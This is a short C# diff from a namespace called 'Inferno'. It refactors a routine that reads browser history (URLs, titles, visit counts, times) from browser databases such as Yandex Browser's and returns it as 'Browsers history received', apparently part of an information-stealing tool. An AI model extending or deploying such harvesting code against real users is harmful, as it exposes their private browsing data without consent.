@@ -45,7 +45,7 @@ namespace Inferno
                 l_a + "Yandex\\YandexBrowser" + u_s
             };
 
-            List<string[]> history = new List<string[]>();
+            List<Dictionary<string, string>> historys = new List<Dictionary<string, string>>();
             // Database
             string tempHistoryLocation = "";
 
@@ -82,20 +82,20 @@ namespace Inferno
                     {
                         break;
                     }
-                    string[] credentials = new string[4]
+                    Dictionary<string, string> credentials = new Dictionary<string, string>
                     {
-                        url,
-                        Crypt.toUTF8(title),
-                        visits,
-                        time
+                        ["url"] = url,
+                        ["title"] = Crypt.toUTF8(title),
+                        ["visits"] = visits,
+                        ["time"] = time
                     };
-                    history.Add(credentials);
+                    historys.Add(credentials);
                     continue;
                 }
                 continue;
             }
 
-            output.history = history;
+            output.history = historys;
             core.Exit("Browsers history received", output);
         }
     }
